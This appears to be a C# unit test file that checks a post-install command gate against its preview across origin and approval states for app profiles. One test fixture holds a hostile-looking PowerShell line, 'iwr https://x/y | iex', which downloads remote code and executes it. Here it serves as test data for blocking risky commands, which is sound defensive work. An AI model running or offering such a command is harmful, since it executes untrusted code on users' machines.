// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public sealed class CommandPreviewSlotTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "ctrlz-slotpreview-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_folder))
        {
            Directory.Delete(_folder, recursive: true);
        }
    }

    public static IEnumerable<object[]> Combinations()
    {
        foreach (var origin in new[] { ProfileOrigin.Local, ProfileOrigin.Imported, ProfileOrigin.Unknown })
        foreach (var approval in new[] { "none", "current", "outdated", "otherApp" })
        foreach (var enabled in new[] { false, true })
        foreach (var risky in new[] { false, true })
        {
            yield return new object[] { origin, approval, enabled, risky };
        }
    }

    [Theory]
    [MemberData(nameof(Combinations))]
    public void Preview_and_gate_agree_for_every_slot_state(ProfileOrigin origin, string approval, bool enabled, bool risky)
    {
        var origins = new ProfileOriginStore(Path.Combine(_folder, "o.json"));
        var approvals = new PostInstallApprovalStore(Path.Combine(_folder, "a.json"));
        var command = risky
            ? new PostInstallCommand { Id = "c1", Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = enabled }
            : new PostInstallCommand { Id = "c1", Executable = "reg.exe", Arguments = ["import", "a.reg"], Enabled = enabled };
        var app = new AppEntry { Id = "app", Name = "Tool", PostInstall = command };
        var profile = new AppProfile { Id = "p1", Apps = [app] };
        if (origin != ProfileOrigin.Unknown)
        {
            origins.Set(profile.Id, origin);
        }

        switch (approval)
        {
            case "current":
                approvals.Approve(profile.Id, app.Id, command);
                break;
            case "outdated":
                var before = command.Clone();
                before.Arguments.Add("--before-edit");
                approvals.Approve(profile.Id, app.Id, before);
                break;
            case "otherApp":
                approvals.Approve(profile.Id, "another-app", command);
                break;
        }

        var verdict = new PostInstallCommandGate(origins, approvals).EvaluateCommand(profile, app, command);
        var line = Assert.Single(CommandPreview.ForProfile(profile, origins.Get(profile.Id), approvals));

        Assert.Equal(verdict.MayRun, line.WillRun);
        if (origin != ProfileOrigin.Local && approval == "outdated")
        {
            Assert.Equal(CommandRunState.NeedsReview, line.State);
            Assert.Equal(CommandDecision.NeedsReview, verdict.Decision);
            Assert.StartsWith("Edited since approval - needs review", line.StateText);
        }

        if (origin != ProfileOrigin.Local && approval == "otherApp")
        {
            // An approval for the same text in another app does not carry over.
            Assert.False(line.WillRun);
            Assert.Equal(CommandRunState.Blocked, line.State);
        }
    }
}
